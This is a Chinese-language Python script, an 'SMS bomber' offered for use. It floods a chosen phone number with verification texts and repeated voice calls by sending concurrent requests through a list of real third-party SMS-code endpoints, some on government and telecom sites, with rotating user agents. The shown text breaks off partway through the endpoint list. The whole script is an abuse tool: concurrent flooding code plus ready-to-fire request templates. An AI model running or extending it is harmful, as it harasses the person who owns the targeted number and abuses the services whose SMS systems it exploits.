#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""小硕短信轰炸 2.0 —— 单文件版。

文件结构（从上往下就是执行顺序）::

    1. 依赖导入
    2. 全局配置
    3. 终端输出 / 进度条
    4. 签名与编码工具（原脚本里那些乱码函数）
    5. 设备号
    6. 占位符替换 / 请求构造
    7. 发送引擎
    8. 结果统计
    9. 启动横幅
    10. 接口清单（数据区，135 条 + 语音 1 条）
    11. 命令行与主流程
    12. 入口（if __name__ == "__main__"）

常用命令::

    python 小硕短信轰炸2.0.py                      # 交互式输入手机号，默认 5 轮
    python 小硕短信轰炸2.0.py 13800000000           # 直接带号码
    python 小硕短信轰炸2.0.py 13800000000 -r 10 -w 50
    python 小硕短信轰炸2.0.py --dry-run             # 只列接口，不发请求
    python 小硕短信轰炸2.0.py 13800000000 -k aldi   # 只跑名字/URL 含关键字的接口
    python 小硕短信轰炸2.0.py --self-test           # 自检（哈希实现 + 接口数据）

依赖::

    pip install requests            # 必需
    pip install tqdm colorama       # 可选：进度条 + 彩色输出，没有也能跑
"""

# ============================================================================
# 1. 依赖导入
# ============================================================================
from __future__ import annotations

import argparse
import hashlib
import json
import os
import random
import re
import struct
import sys
import time
import uuid
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Iterable, Sequence, TextIO
from urllib.parse import urlsplit

import requests

try:  # 彩色输出（可选）
    from colorama import init as _colorama_init

    _colorama_init(autoreset=False)
    _HAS_COLORAMA = True
except ImportError:  # pragma: no cover - 环境相关
    _HAS_COLORAMA = False

try:  # 进度条（可选）
    from tqdm import tqdm as _tqdm
except ImportError:  # pragma: no cover - 环境相关
    _tqdm = None

for _stream in (sys.stdout, sys.stderr):  # 保持系统编码，只放宽错误处理，避免中文输出直接报错
    if hasattr(_stream, "reconfigure"):
        try:
            _stream.reconfigure(errors="replace")
        except (ValueError, OSError):  # pragma: no cover - 少见的环境限制
            pass

__version__ = "2.1.0"

# ============================================================================
# 2. 全局配置
# ============================================================================
PHONE_TOKEN = "__PHONE__"
UA_TOKEN = "__UA__"
TIMESTAMP_TOKEN = "__TIMESTAMP__"

DEFAULT_TIMEOUT = 4.0  # 单请求超时（秒）
DEFAULT_WORKERS = 30  # 并发线程数
DEFAULT_ROUNDS = 5  # 默认轮数
DEFAULT_VOICE_TIMES = 10  # 语音呼叫次数
DEFAULT_VOICE_INTERVAL = 5.0  # 语音呼叫间隔（秒）

ERROR_TEXT_LIMIT = 100  # 日志里错误信息截断长度

#: 随机 User-Agent 池，``__UA__`` 从这里取值
USER_AGENTS: tuple[str, ...] = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) "
    "Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/120.0.0.0 Safari/537.36",
)

#: 一条接口配置的结构：name / method / url / headers / data / cookies
Endpoint = dict[str, Any]

# ============================================================================
# 3. 终端输出 / 进度条
# ============================================================================
_COLOR_CODES = {
    "red": "31",
    "green": "32",
    "yellow": "33",
    "blue": "34",
    "magenta": "35",
    "cyan": "36",
    "white": "37",
}


def supports_color() -> bool:
    """当前终端能不能显示颜色。"""
    if os.environ.get("NO_COLOR"):
        return False
    return bool(getattr(sys.stdout, "isatty", lambda: False)())


def paint(text: str, color: str | None = None, bold: bool = False) -> str:
    """给文字上色；终端不支持时原样返回。"""
    if not color or not supports_color():
        return text
    code = _COLOR_CODES.get(color, "")
    if not code:
        return text
    return f"\033[{('1;' + code) if bold else code}m{text}\033[0m"


def echo(text: str = "", color: str | None = None) -> None:
    """打印一行，可上色。"""
    print(paint(text, color))


def info(text: str) -> None:
    """普通提示。"""
    echo(f"[*] {text}", "cyan")


def success(text: str) -> None:
    """成功提示。"""
    echo(f"[+] {text}", "green")


def warn(text: str) -> None:
    """警告提示。"""
    echo(f"[!] {text}", "yellow")


def error(text: str) -> None:
    """错误提示。"""
    echo(f"[-] {text}", "red")


class _PlainProgress:
    """没有 tqdm 时的空进度条，接口与 tqdm 保持一致。"""

    def __init__(self, total: int, desc: str = "") -> None:
        self.total = total
        self.desc = desc
        self.count = 0

    def __enter__(self) -> "_PlainProgress":
        return self

    def __exit__(self, *exc_info: Any) -> None:
        self.close()

    def update(self, n: int = 1) -> None:
        """前进 n 步。"""
        self.count += n

    def set_postfix_str(self, text: str, refresh: bool = True) -> None:  # noqa: ARG002
        """兼容 tqdm 接口，无进度条时什么都不做。"""

    def close(self) -> None:
        """收尾。"""


def progress(total: int, desc: str = "") -> Any:
    """返回一个可 with 的进度条（有 tqdm 用它，没有就空实现）。"""
    if _tqdm is not None:
        return _tqdm(
            total=total,
            desc=desc,
            unit="个",
            ncols=88,
            bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]",
        )
    return _PlainProgress(total, desc)


def ensure_dependencies() -> None:
    """启动时检查可选依赖，只提示，不偷偷 pip install。"""
    missing = []
    if not _HAS_COLORAMA:
        missing.append("colorama")
    if _tqdm is None:
        missing.append("tqdm")
    if missing:
        warn(f"缺少可选依赖 {', '.join(missing)}，输出会降级：pip install {' '.join(missing)}")

# ============================================================================
# 4. 签名与编码工具
#    原脚本里那些 r77d51986… / d8556af1… 之类的乱码函数名，作用如下:
#        r77d51986dcf44955e359a8c19bf72837  →  sha1_hex
#        d8556af1cbf9e4f0e1068c38bd6fedb14  →  sha256_hex
#        oba392eaed8208d36ddbeb7fe66fd5637  →  md5_hex
#        l9871472f620c6f46c93728e92d1349a9  →  rc4_text
#        r7589ac6513307d1fa97b2b8a73755751  →  rc4_bytes
#        i7c6fb3134c356bf9fbdd691a378d51dc  →  to_hex
#        d5fd39c2a334d0204425bf97bbcb28876  →  from_hex
#        y7d70291d2190fbf7b67ecb87e278aa4e  →  base64_encode
#        j33fc4a568bf04579668abcde95784917  →  base64_decode
#        r5be224d49f6cdd36b448a304e14ca7ac  →  base64_encode(alphabet=...)
#    这批函数主流程没调用，是留给“需要自己算签名/加密参数”的接口用的。
# ============================================================================
ALPHABET_STANDARD = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
ALPHABET_URLSAFE = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"

_MASK32 = 0xFFFFFFFF


def _to_bytes(data: str | bytes) -> bytes:
    """统一成 bytes。"""
    return data.encode("utf-8") if isinstance(data, str) else data


def _sha1_rotate_left(value: int, bits: int) -> int:
    """32 位循环左移。"""
    return ((value << bits) | (value >> (32 - bits))) & _MASK32


def _sha1_pad(message: bytes) -> bytes:
    """SHA-1 补位（0x80 + 0x00… + 64 位长度）。"""
    length = len(message)
    message += b"\x80"
    message += b"\x00" * ((56 - (length + 1) % 64) % 64)
    message += struct.pack(">Q", length * 8)
    return message


def sha1_hex(data: str | bytes) -> str:
    """纯 Python 的 SHA-1，返回 40 位十六进制字符串。"""
    h0, h1, h2, h3, h4 = 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0
    message = _sha1_pad(_to_bytes(data))

    for offset in range(0, len(message), 64):
        words = list(struct.unpack(">16I", message[offset:offset + 64])) + [0] * 64
        for index in range(16, 80):
            words[index] = _sha1_rotate_left(
                words[index - 3] ^ words[index - 8] ^ words[index - 14] ^ words[index - 16], 1
            )

        a, b, c, d, e = h0, h1, h2, h3, h4
        for index in range(80):
            if index < 20:
                f, k = (b & c) | ((~b) & d), 0x5A827999
            elif index < 40:
                f, k = b ^ c ^ d, 0x6ED9EBA1
            elif index < 60:
                f, k = (b & c) | (b & d) | (c & d), 0x8F1BBCDC
            else:
                f, k = b ^ c ^ d, 0xCA62C1D6

            temp = (_sha1_rotate_left(a, 5) + f + e + k + words[index]) & _MASK32
            e, d, c, b, a = d, c, _sha1_rotate_left(b, 30), a, temp

        h0, h1, h2, h3, h4 = (
            (h0 + a) & _MASK32,
            (h1 + b) & _MASK32,
            (h2 + c) & _MASK32,
            (h3 + d) & _MASK32,
            (h4 + e) & _MASK32,
        )

    return "%08x%08x%08x%08x%08x" % (h0, h1, h2, h3, h4)


_SHA256_INIT = (
    0x6A09E667, 0xBB67AE85, 0x3C6EF372, 0xA54FF53A,
    0x510E527F, 0x9B05688C, 0x1F83D9AB, 0x5BE0CD19,
)

_SHA256_K = (
    0x428A2F98, 0x71374491, 0xB5C0FBCF, 0xE9B5DBA5, 0x3956C25B, 0x59F111F1, 0x923F82A4, 0xAB1C5ED5,
    0xD807AA98, 0x12835B01, 0x243185BE, 0x550C7DC3, 0x72BE5D74, 0x80DEB1FE, 0x9BDC06A7, 0xC19BF174,
    0xE49B69C1, 0xEFBE4786, 0x0FC19DC6, 0x240CA1CC, 0x2DE92C6F, 0x4A7484AA, 0x5CB0A9DC, 0x76F988DA,
    0x983E5152, 0xA831C66D, 0xB00327C8, 0xBF597FC7, 0xC6E00BF3, 0xD5A79147, 0x06CA6351, 0x14292967,
    0x27B70A85, 0x2E1B2138, 0x4D2C6DFC, 0x53380D13, 0x650A7354, 0x766A0ABB, 0x81C2C92E, 0x92722C85,
    0xA2BFE8A1, 0xA81A664B, 0xC24B8B70, 0xC76C51A3, 0xD192E819, 0xD6990624, 0xF40E3585, 0x106AA070,
    0x19A4C116, 0x1E376C08, 0x2748774C, 0x34B0BCB5, 0x391C0CB3, 0x4ED8AA4A, 0x5B9CCA4F, 0x682E6FF3,
    0x748F82EE, 0x78A5636F, 0x84C87814, 0x8CC70208, 0x90BEFFFA, 0xA4506CEB, 0xBEF9A3F7, 0xC67178F2,
)


def _sha256_rotate_right(value: int, bits: int) -> int:
    """32 位循环右移。"""
    return ((value >> bits) | (value << (32 - bits))) & _MASK32


def _sha256_pad(message: bytes) -> bytes:
    """SHA-256 补位。"""
    length = len(message)
    message += b"\x80"
    message += b"\x00" * ((64 - (length + 9) % 64) % 64)
    message += struct.pack(">Q", length * 8)
    return message


def sha256_hex(data: str | bytes) -> str:
    """纯 Python 的 SHA-256，返回 64 位十六进制字符串。"""
    state = list(_SHA256_INIT)
    message = _sha256_pad(_to_bytes(data))

    for offset in range(0, len(message), 64):
        words = list(struct.unpack(">16I", message[offset:offset + 64])) + [0] * 48
        for index in range(16, 64):
            s0 = (
                _sha256_rotate_right(words[index - 15], 7)
                ^ _sha256_rotate_right(words[index - 15], 18)
                ^ (words[index - 15] >> 3)
            )
            s1 = (
                _sha256_rotate_right(words[index - 2], 17)
                ^ _sha256_rotate_right(words[index - 2], 19)
                ^ (words[index - 2] >> 10)
            )
            words[index] = (words[index - 16] + s0 + words[index - 7] + s1) & _MASK32

        a, b, c, d, e, f, g, h = state
        for index in range(64):
            s1 = (
                _sha256_rotate_right(e, 6)
                ^ _sha256_rotate_right(e, 11)
                ^ _sha256_rotate_right(e, 25)
            )
            ch = (e & f) ^ ((~e) & g)
            temp1 = (h + s1 + ch + _SHA256_K[index] + words[index]) & _MASK32
            s0 = (
                _sha256_rotate_right(a, 2)
                ^ _sha256_rotate_right(a, 13)
                ^ _sha256_rotate_right(a, 22)
            )
            maj = (a & b) ^ (a & c) ^ (b & c)
            temp2 = (s0 + maj) & _MASK32

            h, g, f, e = g, f, e, (d + temp1) & _MASK32
            d, c, b = c, b, a
            a = (temp1 + temp2) & _MASK32

        state = [(old + new) & _MASK32 for old, new in zip(state, (a, b, c, d, e, f, g, h))]

    return "".join(f"{value:08x}" for value in state)


def md5_hex(data: str | bytes) -> str:
    """MD5 十六进制摘要。"""
    return hashlib.md5(_to_bytes(data)).hexdigest()


def _rc4_keystream(key: bytes, length: int) -> bytes:
    """RC4 的 KSA + PRGA，输出 length 字节密钥流。"""
    schedule = list(range(256))
    j = 0
    for i in range(256):
        j = (j + schedule[i] + key[i % len(key)]) % 256
        schedule[i], schedule[j] = schedule[j], schedule[i]

    stream = bytearray()
    i = j = 0
    for _ in range(length):
        i = (i + 1) % 256
        j = (j + schedule[i]) % 256
        schedule[i], schedule[j] = schedule[j], schedule[i]
        stream.append(schedule[(schedule[i] + schedule[j]) % 256])
    return bytes(stream)


def rc4_bytes(data: str | bytes, key: str | bytes) -> bytes:
    """RC4 加解密（对称），返回 bytes。"""
    raw, k = _to_bytes(data), _to_bytes(key)
    return bytes(a ^ b for a, b in zip(raw, _rc4_keystream(k, len(raw))))


def rc4_text(data: str | bytes, key: str | bytes) -> str:
    """RC4 加解密，结果按 UTF-8 解码成字符串。"""
    return rc4_bytes(data, key).decode("utf-8")


def to_hex(data: str | bytes) -> str:
    """字符串/字节 → 小写十六进制。"""
    return _to_bytes(data).hex()


def from_hex(hex_text: str) -> bytes:
    """十六进制 → bytes。"""
    return bytes.fromhex(hex_text)


def base64_encode(data: str | bytes, alphabet: str = ALPHABET_STANDARD) -> str:
    """Base64 编码，支持自定义字母表。"""
    if len(alphabet) != 64:
        raise ValueError("Base64 字母表必须是 64 个字符")
    bits = "".join(f"{byte:08b}" for byte in _to_bytes(data))
    encoded = "".join(
        alphabet[int(bits[i:i + 6].ljust(6, "0"), 2)] for i in range(0, len(bits), 6)
    )
    return encoded + "=" * (-len(encoded) % 4)


def base64_decode(text: str, alphabet: str = ALPHABET_STANDARD) -> str:
    """Base64 解码，返回 UTF-8 字符串。"""
    lookup = {char: index for index, char in enumerate(alphabet)}
    bits = "".join(f"{lookup[char]:06b}" for char in text.rstrip("=") if char in lookup)
    return bytes(int(bits[i:i + 8], 2) for i in range(0, len(bits) - 7, 8)).decode("utf-8")


def crypto_self_check() -> bool:
    """和标准库对一遍，确认上面的实现没写歪。"""
    import base64 as _b64

    for sample in ("", "abc", "13800000000", "小硕短信轰炸", "x" * 200):
        raw = sample.encode()
        assert sha1_hex(sample) == hashlib.sha1(raw).hexdigest(), "SHA-1 不一致"
        assert sha256_hex(sample) == hashlib.sha256(raw).hexdigest(), "SHA-256 不一致"
        assert md5_hex(sample) == hashlib.md5(raw).hexdigest(), "MD5 不一致"
        assert base64_encode(sample) == _b64.b64encode(raw).decode(), "Base64 编码不一致"
        assert base64_decode(base64_encode(sample)) == sample, "Base64 解码不一致"
        assert rc4_text(rc4_bytes(sample, "key"), "key") == sample, "RC4 往返不一致"
        assert from_hex(to_hex(sample)) == raw, "十六进制往返不一致"
    return True

# ============================================================================
# 5. 设备号
# ============================================================================
DEFAULT_DEVICE_FILE = ".imei"


def load_or_create_device_id(path: str | Path = DEFAULT_DEVICE_FILE) -> str:
    """读取设备号；没有就生成 UUID1 并落盘（原 get_device_id 的逻辑）。"""
    device_file = Path(path)
    if device_file.exists():
        device_id = device_file.read_text(encoding="utf-8").strip()
        if device_id:
            return device_id

    device_id = str(uuid.uuid1())
    device_file.write_text(device_id, encoding="utf-8")
    return device_id

# ============================================================================
# 6. 占位符替换 / 请求构造
# ============================================================================
def pick_user_agent() -> str:
    """随机取一个 User-Agent。"""
    return random.choice(USER_AGENTS)


def fill_placeholders(
    value: Any,
    phone: str,
    *,
    user_agent: str,
    timestamp: str,
) -> Any:
    """递归替换 __PHONE__ / __UA__ / __TIMESTAMP__，返回新对象（不改入参）。"""
    if isinstance(value, str):
        return (
            value.replace(PHONE_TOKEN, phone)
            .replace(UA_TOKEN, user_agent)
            .replace(TIMESTAMP_TOKEN, timestamp)
        )
    if isinstance(value, dict):
        return {
            fill_placeholders(key, phone, user_agent=user_agent, timestamp=timestamp):
                fill_placeholders(val, phone, user_agent=user_agent, timestamp=timestamp)
            for key, val in value.items()
        }
    if isinstance(value, list):
        return [
            fill_placeholders(item, phone, user_agent=user_agent, timestamp=timestamp)
            for item in value
        ]
    return value


@dataclass(slots=True)
class PreparedRequest:
    """一条可以直接交给 requests 的请求。"""

    name: str
    method: str
    url: str
    headers: dict[str, Any] = field(default_factory=dict)
    cookies: dict[str, Any] | None = None
    json_body: Any = None  # 接口里 data 是字典时走 json=
    data_body: Any = None  # 接口里 data 是字符串时走 data=


def prepare_request(
    endpoint: Endpoint,
    phone: str,
    *,
    user_agent: str | None = None,
    timestamp: float | None = None,
) -> PreparedRequest:
    """把一条接口配置补齐成真正的请求。

    :param endpoint: 数据区里的一条接口
    :param phone: 目标手机号
    :param user_agent: 指定 UA，默认随机
    :param timestamp: 指定时间戳，默认当前时间
    """
    ua = user_agent or pick_user_agent()
    ts = str(int(timestamp if timestamp is not None else time.time()))
    filled = fill_placeholders(endpoint, phone, user_agent=ua, timestamp=ts)

    method = str(filled["method"]).upper()
    url = str(filled["url"])
    body = filled.get("data")

    return PreparedRequest(
        name=filled.get("name") or urlsplit(url).netloc,
        method=method,
        url=url,
        headers=dict(filled.get("headers") or {}),
        cookies=filled.get("cookies") or None,
        json_body=body if isinstance(body, dict) else None,
        data_body=body if isinstance(body, (str, bytes)) else None,
    )

# ============================================================================
# 7. 发送引擎
# ============================================================================
@dataclass(slots=True)
class SendResult:
    """单条接口的发送结果。"""

    name: str
    method: str
    url: str
    ok: bool
    status: int | None = None
    error: str | None = None
    elapsed: float = 0.0

    def describe(self) -> str:
        """给日志用的一行摘要。"""
        if self.ok:
            return f"[OK] {self.status} {self.elapsed * 1000:.0f}ms {self.name}"
        return f"[FAIL] {self.error} {self.name}"


def send_once(
    endpoint: Endpoint,
    phone: str,
    *,
    timeout: float = DEFAULT_TIMEOUT,
    session: Any = None,
) -> SendResult:
    """发送单条接口；任何异常都转成 SendResult，不往外抛。"""
    try:
        req = prepare_request(endpoint, phone)
    except Exception as exc:  # 配置写错也要让整轮跑完
        return SendResult(
            name=str(endpoint.get("name", "?")),
            method=str(endpoint.get("method", "?")),
            url=str(endpoint.get("url", "")),
            ok=False,
            error=f"配置错误 {type(exc).__name__}: {exc}"[:ERROR_TEXT_LIMIT],
        )

    body_kwargs: dict[str, Any] = {}
    if req.method != "GET":
        if req.json_body is not None:
            body_kwargs["json"] = req.json_body
        elif req.data_body is not None:
            body_kwargs["data"] = req.data_body

    client = session or requests
    started = time.perf_counter()
    try:
        response = client.request(
            req.method,
            req.url,
            headers=req.headers,
            cookies=req.cookies,
            timeout=timeout,
            **body_kwargs,
        )
    except Exception as exc:  # 连接失败 / 超时 / URL 非法
        return SendResult(
            name=req.name,
            method=req.method,
            url=req.url,
            ok=False,
            error=f"{type(exc).__name__}: {exc}"[:ERROR_TEXT_LIMIT],
            elapsed=time.perf_counter() - started,
        )

    return SendResult(
        name=req.name,
        method=req.method,
        url=req.url,
        ok=True,
        status=response.status_code,
        elapsed=time.perf_counter() - started,
    )


ResultCallback = Callable[[SendResult], None]


def send_round(
    endpoints: Sequence[Endpoint],
    phone: str,
    *,
    workers: int = DEFAULT_WORKERS,
    timeout: float = DEFAULT_TIMEOUT,
    on_result: ResultCallback | None = None,
) -> list[SendResult]:
    """并发发完一轮，每完成一条回调一次 on_result（给进度条用）。"""
    results: list[SendResult] = []
    if not endpoints:
        return results

    with ThreadPoolExecutor(max_workers=max(1, workers)) as pool:
        futures = {pool.submit(send_once, ep, phone, timeout=timeout): ep for ep in endpoints}
        for future in as_completed(futures):
            result = future.result()
            results.append(result)
            if on_result is not None:
                on_result(result)
    return results


def send_voice_call(
    endpoint: Endpoint,
    phone: str,
    *,
    times: int = DEFAULT_VOICE_TIMES,
    interval: float = DEFAULT_VOICE_INTERVAL,
    timeout: float = 3.0,
    on_result: ResultCallback | None = None,
) -> list[SendResult]:
    """语音呼叫接口：连打 times 次，每次间隔 interval 秒。"""
    results: list[SendResult] = []
    for index in range(times):
        result = send_once(endpoint, phone, timeout=timeout)
        results.append(result)
        if on_result is not None:
            on_result(result)
        if index < times - 1:
            time.sleep(interval)
    return results

# ============================================================================
# 8. 结果统计
# ============================================================================
@dataclass(slots=True)
class SendSummary:
    """一轮或多轮结果的汇总，可直接打印。"""

    total: int = 0
    success: int = 0
    failed: int = 0
    status_counts: Counter = field(default_factory=Counter)
    error_counts: Counter = field(default_factory=Counter)

    @property
    def success_rate(self) -> float:
        """成功率（0~1）。"""
        return self.success / self.total if self.total else 0.0

    def add(self, result: SendResult) -> None:
        """累计一条结果。"""
        self.total += 1
        if result.ok:
            self.success += 1
            self.status_counts[result.status] += 1
        else:
            self.failed += 1
            reason = (result.error or "").split(":")[0].strip() or "未知错误"
            self.error_counts[reason] += 1

    def merge(self, results: Iterable[SendResult]) -> "SendSummary":
        """批量累计结果。"""
        for result in results:
            self.add(result)
        return self

    def combine(self, other: "SendSummary") -> "SendSummary":
        """把另一份汇总累加进来。"""
        self.total += other.total
        self.success += other.success
        self.failed += other.failed
        self.status_counts.update(other.status_counts)
        self.error_counts.update(other.error_counts)
        return self

    def render(self, title: str = "汇总") -> str:
        """渲染成多行文本报告。"""
        lines = [
            f"{title}: 共 {self.total} 次，成功 {self.success}，失败 {self.failed}，"
            f"成功率 {self.success_rate:.1%}"
        ]
        if self.status_counts:
            ranked = sorted(self.status_counts.items(), key=lambda item: -item[1])
            detail = "，".join(f"{code or '无响应'}×{count}" for code, count in ranked)
            lines.append(f"  HTTP 状态: {detail}")
        if self.error_counts:
            detail = "，".join(
                f"{name}×{count}" for name, count in self.error_counts.most_common(6)
            )
            lines.append(f"  失败原因: {detail}")
        return "\n".join(lines)

# ============================================================================
# 9. 启动横幅
# ============================================================================
#: 每条横幅为 (颜色, 文本)
BANNER_LINES: tuple[tuple[str, str], ...] = (
    ("cyan", "-------------------------------------------------"),
    ("blue", " ____  ____      _ _ _ _"),
    ("blue", " \\ \\   / /     / _ _ _  |"),
    ("blue", "  \\     /     |  |   ____"),
    ("blue", "  /     \\     |  |___|   |"),
    ("blue", "/_/   \\_\\     \\_ _ _ _ | "),
    ("green", " 小硕短信轰炸版本"),
    ("green", " 小硕官方"),
    ("green", " 小硕短信轰炸官方频道:@gsxh91"),
    ("cyan", "-------------------------------------------------"),
    ("green", "官方频道:@gsxh91"),
    ("green", "永久公益"),
    ("green", "作者:小硕"),
)

BANNER_CHAR_DELAY = 0.02
BANNER_LINE_DELAY = 0.1


def print_banner(
    *,
    animated: bool = True,
    stream: TextIO | None = None,
    char_delay: float = BANNER_CHAR_DELAY,
    line_delay: float = BANNER_LINE_DELAY,
) -> None:
    """打印彩色 LOGO。

    :param animated: True 逐字打印（打字机效果），False 一次性输出
    """
    out = stream or sys.stdout
    if not animated:
        out.write("\n".join(paint(text, color) for color, text in BANNER_LINES) + "\n")
        out.flush()
        return

    for color, line in BANNER_LINES:
        for char in line:
            out.write(paint(char, color))
            out.flush()
            time.sleep(char_delay)
        out.write("\n")
        out.flush()
        time.sleep(line_delay)

# ============================================================================
# 10. 接口清单（数据区）
#     - 每条接口：{name, method, url, headers, data?, cookies?}
#     - 占位符：__PHONE__ 手机号 / __UA__ 随机 UA / __TIMESTAMP__ 秒级时间戳
#     - 加接口：照格式往对应列表里追加即可，逻辑代码一行都不用动
#     - 带 __PHONE__ 的接口会自动跟随目标号码；写死的号码一律视作占位号
# ============================================================================
# ==================== 第一批：小程序 / 公众号短信接口（原脚本最早积累的一批） ====================

MINIAPP_ENDPOINTS: list[Endpoint] = [
    {
        "name": "glm.glodon.com",
        "method": "POST",
        "url": "https://glm.glodon.com/glm/worker-app-aggregator/gjg/account/message/code",
        "headers": {
            "Host": "glm.glodon.com",
            "content-type": "application/json",
            "xweb_xhr": "1",
            "user-agent": "__UA__",
            "accept": "*/*",
            "sec-fetch-site": "cross-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://servicewechat.com/wxb25232612195a5a8/92/page-frame.html",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "zh-CN,zh;q=0.9",
            "priority": "u=1, 1",
        },
        "data": {"mobile": "__PHONE__", "platform": 4, "type": 2},
    },
    {
        "name": "shop.gdzlw.cn",
        "method": "GET",
        "url": "https://shop.gdzlw.cn/api/app/member/getWxMiniAppLoginSmsCode?phone=__PHONE__",
        "headers": {"User-Agent": "__UA__"},
    },
    {
        "name": "aqkhfz.yjglt.gxzf.gov.cn:1888",
        "method": "GET",
        "url": "https://aqkhfz.yjglt.gxzf.gov.cn:1888/api//tbl_temuserinfo/temuserinfo/SMSCode?phone=__PHONE__",
        "headers": {"User-Agent": "__UA__"},
    },
    {
        "name": "1958xy.com",
        "method": "GET",
        "url": "https://www.1958xy.com/app/v2/user/getLoginCode?phone=__PHONE__",
        "headers": {"User-Agent": "__UA__"},
    },
    {
        "name": "uc.huan.tv",
        "method": "POST",
        "url": "https://uc.huan.tv/mobile/mobile/sendMobileVerifycode?f=5",
        "headers": {
            "Host": "uc.huan.tv",
            "accept": "*/*",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "__UA__",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://uc.huan.tv",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": (
                "https://uc.huan.tv/mobile/mobile/msgcodelogin?dnum=&didtoken=&src=&flag=true&tvlicense=UC&sn=&"
                "version=&t=&brand=tcl&clienttype=&returnurl=%2Fpages%2Fmy%2Findex&appid=LNJC&shieldLoginType=1&"
                "returntype=2&bindMobile=&loginInput=&md5pwd=&mobile="
            ),
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "zh-CN,zh;q=0.9",
            "cookie": "SERVERERID=6d28be6acaa1f480f39f39ed02b5f234|1773578277|1773578263",
            "priority": "u=1, 1",
        },
        "data": (
            "dnum=&didtoken=&src=&clienttype=&appid=LNJC&activityId=login_code&tvlicense=UC&flag=true&sn=&"
            "version=&t=&brand=tcl&returnurl=%2Fpages%2Fmy%2Findex&shieldLoginType=1&returntype=2&bindMobile=&"
            "mobile=__PHONE__&verifycode=&dnum="
        ),
    },
    {
        "name": "ky.live",
        "method": "POST",
        "url": "https://www.ky.live/api/kylive/getsms",
        "headers": {
            "Host": "www.ky.live",
            "Connection": "keep-alive",
            "xweb_xhr": "1",
            "user-agent": "__UA__",
            "content-type": "application/json",
            "accept": "*/*",
            "sec-fetch-site": "cross-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://servicewechat.com/wx797e817e1b24a1d1/42/page-frame.html",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "zh-CN,zh;q=0.9",
        },
        "data": {"phone": "__PHONE__"},
    },
    {
        "name": "usercenter.i4.cn",
        "method": "POST",
        "url": "https://usercenter.i4.cn/pcuserv3_sendSms.action",
        "headers": {
            "Host": "usercenter.i4.cn",
            "Connection": "keep-alive",
            "xweb_xhr": "1",
            "user-agent": "__UA__",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "accept": "*/*",
            "sec-fetch-site": "cross-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://servicewechat.com/wx46351c28a9201ccd/51/page-frame.html",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "zh-CN,zh;q=0.9",
        },
        "data": "member.phone=__PHONE__&member.appId=&platform=7",
    },
    {
        "name": "tanwan.com",
        "method": "GET",
        "url": (
            "http://www.tanwan.com/api/reg_json_2019.php?act=3&phone=__PHONE__&"
            "callback=jQuery112003247368730630804_1643269992344&_=__TIMESTAMP__"
        ),
        "headers": {"User-Agent": "__UA__"},
    },
    {
        "name": "gdccdz.jmbg.com.cn:1443",
        "method": "POST",
        "url": "https://gdccdz.jmbg.com.cn:1443/charging/end_user/get_phone_message",
        "headers": {
            "Host": "gdccdz.jmbg.com.cn:1443",
            "Connection": "keep-alive",
            "xweb_xhr": "1",
            "loginType": "WECHAT",
            "user-agent": "__UA__",
            "content-type": "application/x-www-form-urlencoded",
            "accept": "*/*",
            "sec-fetch-site": "cross-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://servicewechat.com/wx84a8d1a2e6b14e8f/2/page-frame.html",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "zh-CN,zh;q=0.9",
        },
        "data": "phoneNumber=__PHONE__&smsType=LOGIN_CONFIRN",
    },
    {
        "name": "app.xjylbz.cn",
        "method": "POST",
        "url": "https://app.xjylbz.cn/hsa-pss-appservice/app/forward/acct/appSendRegSms",
        "headers": {
            "Host": "app.xjylbz.cn",
            "Connection": "keep-alive",
            "accessToken": "",
            "xweb_xhr": "1",
            "channel": "wechat",
            "user-agent": "__UA__",
            "content-type": "application/json",
            "accept": "*/*",
            "sec-fetch-site": "cross-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://servicewechat.com/wx1e2d9faa8c564832/68/page-frame.html",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "zh-CN,zh;q=0.9",
        },
        "data": {"mobile": "__PHONE__"},
    },
    {
        "name": "shjz.mzt.xinjiang.gov.cn",
        "method": "GET",
        "url": (
            "https://shjz.mzt.xinjiang.gov.cn/mzjz-py-external-plugin/login_by_qrcode/get_mobile_code?"
            "phone=__PHONE__"
        ),
        "headers": {"User-Agent": "__UA__"},
    },
    {
        "name": "wap.xj.10086.cn",
        "method": "POST",
        "url": "https://wap.xj.10086.cn/quanyi/wechatLogin/getVcode",
        "headers": {
            "Host": "wap.xj.10086.cn",
            "Connection": "keep-alive",
